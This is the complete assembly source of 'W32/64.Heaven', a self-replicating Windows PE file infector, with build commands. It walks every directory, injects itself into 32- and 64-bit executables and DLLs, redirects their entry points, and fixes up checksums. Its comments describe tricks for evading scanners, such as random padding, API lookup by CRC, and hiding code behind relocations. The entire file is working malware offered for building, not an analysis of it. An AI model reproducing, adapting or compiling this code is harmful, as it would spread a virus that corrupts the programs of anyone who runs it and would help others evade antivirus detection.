;W32/64.Heaven by roy g biv
;
;some of its features:
;- parasitic direct action infector of PE exe/dll (but not looking at suffix)
;- infects files in current directory and all subdirectories
;- infects both IA32 and AMD64 files
;- directory traversal is linked-list instead of recursive to reduce stack size
;- reloc section inserter/last section appender
;- uses CRCs instead of API names
;- uses SEH/VEH for common code exit
;- no infect files with data outside of image (eg self-extractors)
;- infected files are padded by random amounts to confuse tail scanners
;- correct file checksum without using imagehlp.dll :) 100% correct algorithm
;---
;
;to build this thing:
;yasm
;----
;yasm -m x86 -f win32 -o heaven.obj heaven.asm
;link heaven.obj kernel32.lib user32.lib /section:.text,erw /entry:heaven /subsystem:console
;---
;old and new - native interface from Chthon, ported to 64-bit, infection from Shrug48
;
;We're in the middle of a phase transition:
;a butterfly flapping its wings at
;just the right moment could
;cause a storm to happen.
;-I'm trying to understand-
;I'm at a moment in my life-
;I don't know where to flap my wings.
;(Danny Hillis)

extern  _MessageBoxA@16:proc
extern  _ExitProcess@4:proc

global _heaven
%include "heaven.inc"
section .text
bits 32
_heaven:mov     edx, ntdcrc_count
        mov     ebx, ntdnames
        mov     edi, ntdcrcbegin
        call    create_crcs
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

heaven_codebegin:
        mov     ecx, gs
        jecxz   host_patch32
        mov     eax, esp
        test    al, 4
        je      heaven_pushesp
        push    eax                             ;qword-align stack else APIs fail

heaven_pushesp:
        push    eax
        push    eax                             ;keep aligned stack, and remember original esp
        push    cs
        call    to64
        pop     esp

host_patch32:
        jmp     do_message                      ;replaced dynamically

to64:   push    0cb0033h                        ;combined selector 33h and retf
        call    to64 + 3
bits 64
        ;set 64-bit current directory equal to 32-bit current directory
        ;otherwise it will be %windir% and that is no good

        push    rsi
        push    rdi
        push    tib.TibTeb
        pop     rsi
        fs lodsd                                ;32-bit PEB
        mov     sil, 24h                        ;32-bit current directory
        add     esi, dword [rax + 10h]          ;32-bit RTL_USER_PROCESS_PARAMETERS
        mov     edi, dword [rax + 1000h + teb64.tebuser]
                                                ;64-bit RTL_USER_PROCESS_PARAMETERS
        mov     edi, dword [rdi + 40h]          ;64-bit current directory

        ;there are multiple pointers to the same location
        ;we overwrite the pointer to an internal one that is used by RtlDosPathNameToRelativeNtPathName_U

        sub     edi, 28h
        movsd                                   ;copy length
        scasd
        movsd                                   ;copy pointer
        scasd
        movsd                                   ;copy root directory object
        pop     rdi
        pop     rsi

host_patch64:
        lea     rcx, qword [RIP + to64 - $ - 4]
                                                ;replaced dynamically
heaven_common:
        push    rcx
        gs push qword [1480h]                   ;esp in 64-bit context, zeroed by exception, must be restored
        push    rbx
        push    rsi
        push    rdi
        push    r8
        push    r9
        enter   (findlist_size - 1) & -8, 0     ;-1 to align at 1 qword earlier
        push    0                               ;zero findprev in findlist
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

ntdcrcbegin:
        times (ntdcrc_count + 1) dd 0
ntdcrcend:
        db      "Heaven - roy g biv"            ;Heaven for me, Hell for others

find_mzhdr:
        push    tib64.TibTeb
        pop     rsi
        gs lodsq ;gs not fs
        mov     eax, dword [rax + teb64.tebLdr]
        mov     eax, dword [rax + ldr.ldrInLoadOrderModuleList]
        mov     rbx, qword [rax + modlist.mlDllBase]
        xchg    esi, eax
        push    rbx
        pop     rsi
        mov     si, word [rbx + mzhdr.mzlfanew]
        pop     rdi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword [rax + rsi + pehdr64.pe64export + pedir.dirrva - tib64.TibTeb - 8]
        lea     esi, qword [rbx + rsi + peexp.expadrrva]
        xor     rax, rax
        lodsd                                   ;Export Address Table RVA
        lea     rdx, qword [rbx + rax]
        lodsd                                   ;Name Pointer Table RVA
        lea     rcx, qword [rbx + rax]
        lodsd                                   ;Ordinal Table RVA
        lea     rbp, qword [rbx + rax]
        push    rcx
        pop     rsi

push_export:
        push    rcx

get_export:
        lodsd
        push    rbx
        add     rbx, rax                        ;Name Pointer VA
        or      eax, -1

crc_outer:
        xor     al, byte [rbx]
        push    byte 8
        pop     rcx

crc_inner:
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip:
        loop    crc_inner
        sub     cl, byte [rbx]                  ;carry set if not zero
        inc     rbx                             ;carry not altered by inc
        jb      crc_outer
        pop     rbx
        cmp     dword [rdi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     rcx
        push    rsi
        pop     rax
        sub     rax, rcx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word [rbp + rax - 2]       ;get export ordinal
        mov     eax, dword [rax * 4 + rdx]      ;get export RVA
        add     rax, rbx
        push    rax
        scasd
        cmp     dword [rdi], 0
        jne     push_export

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dirinit:
        push    rsp
        pop     rbx
        push    tib64.TibTeb
        pop     rsi
        gs lodsq ;gs not fs
        lea     esi, dword [rbx + ntdcrcstk_size]
        mov     rdi, qword [rax + teb64.heaphand]

scan_dir:                                       ;rbx -> platform APIs, rsi -> findlist
        push    '*'
        lea     r9, qword [rsi + findlist.findmask]
        mov     r8, rsp
        push    '*'                             ;need separate strings on 64-bit platform
        lea     rdx, qword [rsi + findlist.findname]
        push    rsp
        pop     rcx
        call    qword [rbx + ntdcrcstk.kRtlDosPathNameToRelativeNtPathName_U]
        pop     rax
        xor     al, al
        push    rax
        push    rax
        push    rax
        lea     rcx, qword [rsi + findlist.findname + UNICODE_STRING.UniLength]
        sub     dword [rcx], 2              ;no count "*"
        push    rcx
        push    rax
        push    OBJECT_ATTRIBUTES_size
        mov     r8, rsp
        push    FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_FOR_BACKUP_INTENT
        push    FILE_SHARE_READ | FILE_SHARE_WRITE
        sub     esp, 20h
        mov     r9, rsp
        mov     edx, FILE_LIST_DIRECTORY | SYNCHRONIZE
        lea     rcx, dword [rsi + findlist.findhand]
        call    qword [rbx + ntdcrcstk.kNtOpenFile]
        mov     esp, ebx
        test    eax, eax
        jnl     find_first
        jmp     find_prev

heaven_fixrsp:
        lea     rsp, qword [rbx + ((findlist_size - 1) & -8) + ntdcrcstk_size + 8]
        pop     rbp
        pop     r9
        pop     r8
        pop     rdi
        pop     rsi
        pop     rbx
        gs pop  qword [1480h]
        ret

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

find_close:
        mov     rcx, qword [rsi + findlist.findhand]
        call    qword [rbx + ntdcrcstk.kNtClose]

find_prev:
        mov     r8, qword [rsi + findlist.findname + UNICODE_STRING.Buffer]
        push    rbp
        pop     rdx
        push    rdi
        pop     rcx
        sub     esp, 20h
        call    qword [rbx + ntdcrcstk.kRtlFreeHeap]
        mov     rcx, qword [rsi + findlist.findprev]
        jrcxz   heaven_fixrsp
        mov     r8, rsi
        push    rcx
        pop     rsi
        push    rbp
        pop     rdx
        push    rdi
        pop     rcx
        call    qword [rbx + ntdcrcstk.kRtlFreeHeap]

step_updir:
        push    ('.' << 10h) + '.'
        push    rsp
        push    4
        push    rsp
        pop     rcx
        sub     esp, 20h
        call    qword [rbx + ntdcrcstk.kRtlSetCurrentDirectory_U]
        mov     esp, ebx
        jmp     find_next

jstep_updir:
        jmp     step_updir

find_first:
        lea     rbp, qword [rsi + findlist.findmask]

find_next:
        xor     edx, edx
        push    rdx
        push    rbp
        push    rsp                             ;non-zero
        push    FileBothDirectoryInformation
        push    FILE_DIRECTORY_INFORMATION_size
        lea     rax, qword [rsi + findlist.finddata]
        push    rax
        push    rsp
        sub     esp, 20h
        xor     rbp, rbp
        xor     r9d, r9d
        xor     r8d, r8d
        mov     rcx, qword [rsi + findlist.findhand]
        call    qword [rbx + ntdcrcstk.kNtQueryDirectoryFile]
        mov     esp, ebx
        test    eax, eax
        jl      find_close

        ;you must always step forward from where you stand

        mov     rcx, qword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirFileNameLength]
        lea     rax, qword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirFileName]
        mov     qword [rax + rcx], rbp
        test    byte [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte [rax], '.'                 ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    rax
        push    rcx
        push    rsp
        pop     rcx
        sub     esp, 20h                        ;many user-mode APIs require this
        call    qword [rbx + ntdcrcstk.kRtlSetCurrentDirectory_U]
        mov     esp, ebx
        test    eax, eax
        jl      find_next
        mov     r8d, findlist_size
        push    rbp
        pop     rdx
        push    rdi
        pop     rcx
        sub     esp, 20h
        call    qword [rbx + ntdcrcstk.kRtlAllocateHeap]
        mov     esp, ebx
        xchg    rcx, rax
        jrcxz   jstep_updir
        xchg    rsi, rcx
        mov     qword [rsi], rcx
        jmp     scan_dir

test_file:
        push    rdi
        push    rsi
        push    rax
        push    rcx
        push    rsp
        pop     rax
        push    rbp                             ;receives map base
        push    rbp                             ;receives map handle
        push    rbp                             ;receives file handle
        push    rsp
        pop     rdi
        push    rbp
        push    rbp
        push    rbp
        push    rax
        push    qword [rsi + findlist.findmask + UNICODE_STRINGDD.RootDir]
        push    OBJECT_ATTRIBUTES_size
        push    rsp
        pop     rsi
        push    FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_FOR_BACKUP_INTENT
        push    rbp
        sub     esp, 20h
        mov     r9, rsp
        mov     r8, rsi
        mov     edx, FILE_WRITE_ATTRIBUTES | SYNCHRONIZE
        push    rdi
        pop     rcx
        call    qword [rbx + ntdcrcstk.kNtOpenFile]
        push    FILE_ATTRIBUTE_ARCHIVE          ;non-zero and not read-only
        push    rbp
        push    rbp
        push    rbp
        push    rbp
        mov     r8, rsp
        push    FileBasicInformation
        sub     esp, 20h
        mov     r9d, FILE_BASIC_INFORMATION_size
        push    rsp
        pop     rdx
        mov     rcx, qword [rdi]
        call    qword [rbx + ntdcrcstk.kNtSetInformationFile]
        mov     rcx, qword [rdi]
        call    qword [rbx + ntdcrcstk.kNtClose]
        mov     qword [rdi], rbp                ;zero handle in case open fails
        push    FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_FOR_BACKUP_INTENT
        push    rbp
        sub     esp, 20h
        mov     r9, rsp
        mov     r8, rsi
        mov     rdx, FILE_READ_DATA | FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE
        push    rdi
        pop     rcx
        call    qword [rbx + ntdcrcstk.kNtOpenFile]
        mov     rsi, qword [rbx - 10h]
        push    rdi
        pop     rsp
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

;-----------------------------------------------------------------------------
;file time and attributes can be set with single call to NtSetInformationFile
;-----------------------------------------------------------------------------

        mov     eax, dword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirFileAttributes]
        mov     dword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirRealFileSize + LARGE_INTEGER.dwordLow], eax
        push    FileBasicInformation
        sub     esp, 20h
        mov     r9d, FILE_BASIC_INFORMATION_size
        lea     r8, qword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirCreationTime]
        push    rsp
        pop     rdx
        mov     rcx, qword [rdi]
        call    qword [rbx + ntdcrcstk.kNtSetInformationFile]
        mov     rcx, qword [rdi]
        call    qword [rbx + ntdcrcstk.kNtClose]
        lea     esp, dword [ebx - 8]
        pop     rdi
        jmp     find_next
;scan_dir        endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr:                                       ;rdi -> map view
        cmp     word [rdi], 'MZ'                ;Windows does not check 'ZM'
        jne     pehdr_ret
        movzx   rsi, word [rdi + mzhdr.mzlfanew]
        cmp     word [rdi], si
        jb      pehdr_ret
        add     rsi, rdi
        lodsd                                   ;VEH protects against bad lfanew value
        add     eax, -'PE'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret:
        ret                                     ;if PE file, then eax = 0, rsi -> COFF header, Z flag set
        db      "11/04/11"                      ;Heaven on Earth
;is_pehdr        endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect:                                    ;rbx -> platform APIs, rsi -> findlist, rdi -> file handle
        call    map_view
        push    rsi
        pop     rbp
        call    is_pehdr
        jne     inftest_ret
        lodsd
        sub     ax, IMAGE_FILE_MACHINE_I386
        je      inftest_ia32                    ;only Intel 386+
        sub     ax, IMAGE_FILE_MACHINE_AMD64 - IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only AMD x86-64
        mov     al, 4

inftest_ia32:
        movzx   rdi, al
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword [rax * 4 + rax]      ;complete multiply by 28h (size pesect)
        mov     ecx, dword [rsi + coffhdr.peflags - coffhdr.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;32-bit executable file if Intel, only executable file if AMD
;-----------------------------------------------------------------------------

        test    ch, IMAGE_FILE_32BIT_MACHINE >> 8
        jne     inftest_flags
        test    di, di
        je      inftest_ret

inftest_flags:
        mov     eax, ecx
        and     ax, IMAGE_FILE_SYSTEM | IMAGE_FILE_EXECUTABLE_IMAGE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE
        jne     inftest_ret
        add     rsi, pehdr.peentrypoint - pehdr.pemagic + coffhdr_size - coffhdr.petimedate

;-----------------------------------------------------------------------------
;if file is a .dll, then we require an entry point function
;-----------------------------------------------------------------------------

        lodsd
        xchg    ecx, eax
        test    ah, IMAGE_FILE_DLL >> 8
        je      test_system
        jecxz   inftest_ret

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

test_system:
        mov     eax, dword [rsi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword [rdi * 4 + rsi + pehdr.pesecurity + pedir.dirrva - pehdr.pecodebase], eax
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   rax, word [rsi + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        mov     ebx, dword [rsi + pehdr.pefilealign - pehdr.pecodebase]
        lea     rsi, qword [rsi + rax - pehdr.pecodebase + pehdr.pemagic - pesect_size + pesect.sectrawsize]
        lodsd
        add     eax, dword [rsi]
        cmp     dword [rbp + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirRealFileSize], eax
        jne     inftest_ret                     ;file contains appended data
        add     dword [rbp + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirRealFileSize], ebx
        inc     dword [rsp + mapvehstk.mapvehinfret]
                                                ;skip call mask

inftest_ret:
        int3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append:
        push    rsi
        push    rsp
        pop     rcx
        call    qword [rbx + ntdcrcstk.kRtlRandom]
        pop     rcx
        and     eax, RANDPADMAX - 1
        add     ax, heaven_codeend - heaven_codebegin + RANDPADMIN
        add     dword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirRealFileSize], eax

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view:                                       ;rbx -> platform APIs, rsi -> findlist, rdi -> file handle
        sub     esp, 20h
        lea     rdx, qword [RIP + unmap_veh - $ - 7]
        mov     ecx, edx                        ;non-zero
        call    qword [rbx + ntdcrcstk.kRtlAddVectoredExceptionHandler]
        push    rax
        push    qword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirRealFileSize]
        push    rsp
        pop     rax
        push    rbp
        push    rsp
        pop     rcx
        push    PAGE_READWRITE                  ;NtMapViewOfSection
        push    rbp                             ;NtMapViewOfSection
        push    1                               ;NtMapViewOfSection
        push    rax                             ;NtMapViewOfSection
        push    rcx                             ;NtMapViewOfSection
        push    rbp                             ;NtMapViewOfSection        
        push    qword [rdi]
        push    08000000h
        push    PAGE_READWRITE
        sub     esp, 20h
        mov     r9, rax
        xor     r8, r8
        mov     edx, STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ
        lea     rcx, qword [rdi + 8]
        call    qword [rbx + ntdcrcstk.kNtCreateSection]
        add     esp, 18h
        xor     r9, r9
        lea     r8, qword [rdi + 10h]
        or      rdx, -1
        mov     rcx, qword [rdi + 8]
        call    qword [rbx + ntdcrcstk.kNtMapViewOfSection]
        push    rbx
        push    rsi
        push    rdi
        mov     dword [RIP + unmap_view - $ - 5], esp
        push    qword [rdi - 10h]
        mov     rdi, qword [rdi + 10h]          ;should succeed even if file cannot be opened
        ret

unmap_veh:
        lea     rax, qword [RIP + unmap_view - $ - 7]
        mov     rcx, qword [rcx + EXCEPTION_POINTERS.ContextRecord]
        mov     qword [rcx + ContextRecord_RIP], rax
        or      eax, -1                         ;EXCEPTION_CONTINUE_EXECUTION
        ret

unmap_view:
        mov     esp, "rgb!"
        pop     rdi
        pop     rsi
        pop     rbx
        mov     rcx, qword [rdi - 38h]
        call    qword [rbx + ntdcrcstk.kRtlRemoveVectoredExceptionHandler]
        mov     rdx, qword [rdi + 10h]
        or      rcx, -1
        call    qword [rbx + ntdcrcstk.kNtUnmapViewOfSection]
        mov     rcx, qword [rdi + 8]
        call    qword [rbx + ntdcrcstk.kNtClose]
        xor     rbp, rbp
        lea     esp, dword [edi - 8]
        ret
;unmap_view      endp
;unmap_veh       endp
;map_view        endp                            ;eax = new file size, rdi = map view
;open_append     endp

;-----------------------------------------------------------------------------
;infect file
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and many zeroes)
;infection:     just change entrypoint
;-----------------------------------------------------------------------------

infect_file:                                    ;rsi -> findlist, rdi = map view
        call    open_append
        push    qword [rsi + findlist.finddata + FILE_DIRECTORY_INFORMATION.dirRealFileSize]
        push    rdi
        mov     ebx, dword [rdi + mzhdr.mzlfanew]
        lea     ebx, qword [rbx + rdi + pehdr.pechksum]
        xor     rcx, rcx
        imul    cx, word [rbx + pehdr.pecoff + coffhdr.pesectcount - pehdr.pechksum], pesect_size
        add     cx, word [rbx + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.pechksum]
        lea     rsi, qword [rbx + rcx + pehdr.pemagic - pehdr.pechksum - pesect_size + pesect.sectrawsize]
        lodsd
        mov     cx, heaven_codeend - heaven_codebegin
        mov     edx, dword [rbx + pehdr.pefilealign - pehdr.pechksum]
        push    rax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword [rsi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword [rsi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword [rsi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword [rsi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword [rbx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword [rbx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff:
        test    byte [rbx + pehdr.pecoff + coffhdr.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cqo
        cmp     byte [rbx + pehdr.pecoff + coffhdr.pemachine - pehdr.pechksum], IMAGE_FILE_MACHINE_I386 & 0ffh
        je      infect_ia32
        mov     dl, (pehdr64.pe64reloc - pehdr64.pe64chksum) - (pehdr.pereloc - pehdr.pechksum)

infect_ia32:
        cmp     dword [rdx + rbx + pehdr.pereloc + pedir.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword [rsi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword [rdx + rbx + pehdr.pereloc + pedir.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword [rdx + rbx + pehdr.pereloc + pedir.dirrva - pehdr.pechksum], ecx
        pop     rax
        push    rsi
        mov     esi, dword [rsi]
        add     edi, esi
        lea     rsi, qword [rdi + rax - 1]
        lea     rdi, qword [rsi + rcx]
        xchg    ecx, eax
        std
        rep     movsb
        cld
        pop     rsi
        pop     rdi
        push    rdi
        push    rcx
        xchg    ecx, eax

copy_code:
        pop     rdx
        add     ebp, edx
        add     edx, dword [rsi]
        add     edi, edx
        push    rsi
        push    rdi
        lea     rsi, qword [RIP + heaven_codebegin - $ - 7]
        rep     movsb
        pop     rdi
        pop     rsi

;-----------------------------------------------------------------------------
;section attributes are always altered to executable because AMD64 will require it
;always altered to writable because VectoredExceptionHandler requires stack pointer
;the write bit could be set at runtime but we lost anti-heuristic already
;-----------------------------------------------------------------------------

        or      byte [rsi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE) >> 18h
        cmp     byte [rbx + pehdr.pecoff + coffhdr.pemachine - pehdr.pechksum], IMAGE_FILE_MACHINE_AMD64 & 0ffh
        je      infect_amd64

;-----------------------------------------------------------------------------
;alter 32-bit entry point
;-----------------------------------------------------------------------------

        xchg    dword [rbx + pehdr.peentrypoint - pehdr.pechksum], ebp
        sub     ebp, dword [rbx + pehdr.peentrypoint - pehdr.pechksum]
        sub     ebp, to64 - heaven_codebegin
        mov     dword [rdi + host_patch32 - heaven_codebegin + 1], ebp
        mov     dword [rdi + host_patch64 - heaven_codebegin + 3], (to64 - host_patch64) - 4
        jmp     checksum_file

;-----------------------------------------------------------------------------
;alter 64-bit entry point
;-----------------------------------------------------------------------------

infect_amd64:
        add     ebp, host_patch64 - heaven_codebegin
        xchg    dword [rbx + pehdr.peentrypoint - pehdr.pechksum], ebp
        sub     ebp, dword [rbx + pehdr.peentrypoint - pehdr.pechksum]
        sub     ebp, 7                          ;size of RIP-relative lea
        mov     dword [rdi + host_patch64 - heaven_codebegin + 3], ebp

checksum_file:
        pop     rdi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xor     ecx, ecx
        xchg    dword [rbx], ecx
        jecxz   infect_ret
        xor     eax, eax
        pop     rcx
        push    rcx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum:
        adc     ax, word [rdi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     rcx
        adc     eax, ecx
        mov     dword [rbx], eax                ;avoid common bug.  ADC not ADD

infect_ret:
        int3                                    ;common exit using VEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
;test_infect     endp

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop:
        sub     rsi, pesect_size
        db      3ch                             ;mask PUSH ESI
rva2raw:                                        ;ecx = RVA, esi -> last section header
        push    rsi
        cmp     dword [rsi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword [rsi + pesect.sectvirtaddr - pesect.sectrawaddr]
        add     ecx, dword [rsi]
        pop     rsi
        ret
;rva2raw        endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

heaven_codeend:

bits 32
create_crcs:
        or      eax, -1

create_outer:
        xor     al, byte [ebx]
        push    byte 8
        pop     ecx

create_inner:
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip:
        loop    create_inner
        sub     cl, byte [ebx]                  ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stosd
        dec     edx
        jne     create_crcs
        ret
;create_crcs     endp

do_message:
        xor     ebx, ebx
        push    ebx
        push    txttitle
        push    txtbody
        push    ebx
        call    _MessageBoxA@16
        push    ebx
        call    _ExitProcess@4

;must be alphabetical order
;API names are not present in replications, only in dropper

ntdnames:       db      "NtClose"                             , 0
                db      "NtCreateSection"                     , 0
                db      "NtMapViewOfSection"                  , 0
                db      "NtOpenFile"                          , 0
                db      "NtQueryDirectoryFile"                , 0
                db      "NtSetInformationFile"                , 0
                db      "NtUnmapViewOfSection"                , 0
                db      "RtlAddVectoredExceptionHandler"      , 0
                db      "RtlAllocateHeap"                     , 0
                db      "RtlDosPathNameToRelativeNtPathName_U", 0
                db      "RtlFreeHeap"                         , 0
                db      "RtlRandom"                           , 0
                db      "RtlRemoveVectoredExceptionHandler"   , 0
                db      "RtlSetCurrentDirectory_U"            , 0

txttitle:       db      "Heaven", 0
txtbody:        db      "running...", 0
